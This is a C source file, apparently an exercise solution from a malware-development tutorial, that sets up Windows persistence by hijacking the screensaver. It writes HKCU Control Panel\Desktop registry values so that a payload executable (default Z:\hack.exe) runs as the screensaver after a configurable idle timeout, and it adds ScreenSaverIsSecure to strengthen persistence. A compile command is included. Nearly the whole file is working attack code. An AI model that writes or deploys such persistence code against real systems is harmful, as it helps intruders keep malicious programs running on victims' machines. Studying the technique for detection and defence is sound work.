/*
 * exercise 3 solution
 * persistence: screensaver hijacking with configurable timeout
 *              and ScreenSaverIsSecure flag
 * hack3.c
 * author: @cocomelonc
 *
 * base: 03-screensaver-hijacking/pers.c
 *
 * changes vs original:
 *   1. timeout is taken from argv[1]  (default: "60")
 *      payload path is taken from argv[2] (default: "Z:\\hack.exe")
 *   2. ScreenSaverIsSecure = "1" is set alongside the other keys
 *
 * ScreenSaverIsSecure explained:
 *   value "1" tells Windows to show the lock screen when the
 *   screensaver exits.  the user must re-authenticate, and until they
 *   do the screensaver (= our payload) can be re-triggered.
 *   this reinforces persistence: the screensaver re-runs on every
 *   idle cycle as long as the session is locked.
 *
 * registry values written to HKCU\Control Panel\Desktop:
 *   ScreenSaveActive    "1"          enable screensaver
 *   ScreenSaveTimeOut   <timeout>    idle seconds before activation
 *   SCRNSAVE.EXE        <payload>    path to the "screensaver" binary
 *   ScreenSaverIsSecure "1"          lock screen on deactivation
 *
 * compile (cross-compile from Linux):
 * x86_64-w64-mingw32-gcc hack3.c -o hack3.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
 */
#include <windows.h>
#include <string.h>
#include <stdio.h>

int main(int argc, char *argv[]) {
  HKEY hkey = NULL;

  /*
   * exercise 3 change 1: configurable timeout and payload path.
   * default values mirror the original pers.c so the solution works
   * out-of-the-box even without arguments.
   */
  const char *timeout = (argc >= 2) ? argv[1] : "60";
  const char *payload = (argc >= 3) ? argv[2] : "Z:\\hack.exe";

  printf("[*] payload:  %s\n", payload);
  printf("[*] timeout:  %s seconds\n", timeout);

  LONG res = RegOpenKeyEx(
    HKEY_CURRENT_USER, "Control Panel\\Desktop",
    0, KEY_WRITE, &hkey
  );
  if (res != ERROR_SUCCESS) {
    printf("[-] RegOpenKeyEx failed: %ld\n", GetLastError());
    return 1;
  }

  /* original keys - unchanged */
  RegSetValueEx(hkey, "ScreenSaveActive",  0, REG_SZ,
                (const BYTE*)"1",    (DWORD)strlen("1")    + 1);
  RegSetValueEx(hkey, "ScreenSaveTimeOut", 0, REG_SZ,
                (const BYTE*)timeout, (DWORD)strlen(timeout) + 1);
  RegSetValueEx(hkey, "SCRNSAVE.EXE",     0, REG_SZ,
                (const BYTE*)payload, (DWORD)strlen(payload) + 1);

  /*
   * exercise 3 change 2: ScreenSaverIsSecure
   * "1" = lock screen required when screensaver deactivates.
   * omitting this value (or setting it to "0") means the session
   * resumes without re-authentication - we want the opposite.
   */
  RegSetValueEx(hkey, "ScreenSaverIsSecure", 0, REG_SZ,
                (const BYTE*)"1", (DWORD)strlen("1") + 1);

  RegCloseKey(hkey);

  printf("[+] screensaver persistence set\n");
  printf("    SCRNSAVE.EXE        = %s\n", payload);
  printf("    ScreenSaveTimeOut   = %s\n", timeout);
  printf("    ScreenSaverIsSecure = 1\n");
  return 0;
}
